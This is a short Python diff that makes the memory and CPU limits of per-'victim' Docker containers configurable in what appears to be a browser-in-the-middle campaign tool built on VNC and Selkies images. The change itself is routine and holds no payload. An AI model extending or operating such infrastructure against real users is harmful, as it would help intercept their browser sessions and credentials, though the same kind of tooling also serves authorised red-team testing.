@@ -39,6 +39,8 @@ ENVIRONMENT = os.getenv("ENVIRONMENT", "production")
 INTERNAL_API_KEY = os.environ["INTERNAL_API_KEY"]
 VNC_IMAGE = os.getenv("VNC_IMAGE", "bitm-vnc:latest")
 SELKIES_IMAGE = os.getenv("SELKIES_IMAGE", "bitm-selkies:latest")
+VICTIM_MEM_LIMIT = os.getenv("VICTIM_MEM_LIMIT", "4g")
+VICTIM_CPUS = float(os.getenv("VICTIM_CPUS", "4.0"))
 MAX_PLUGIN_FILES = 128
 MAX_PLUGIN_FILE_BYTES = 2 * 1024 * 1024
 MAX_PLUGIN_TOTAL_BYTES = 10 * 1024 * 1024
@@ -388,9 +390,9 @@ def create_victim_container(campaign, victim_id: str, user_agent: str, theme: st
         name=container_name,
         detach=True,
         shm_size="1g",
-        mem_limit="4g",
-        memswap_limit="4g",
-        nano_cpus=4_000_000_000,
+        mem_limit=VICTIM_MEM_LIMIT,
+        memswap_limit=VICTIM_MEM_LIMIT,
+        nano_cpus=int(VICTIM_CPUS * 1_000_000_000),
         labels={
             "bitm.victim.id": victim_id,
             "bitm.parent.name": campaign.container_name,
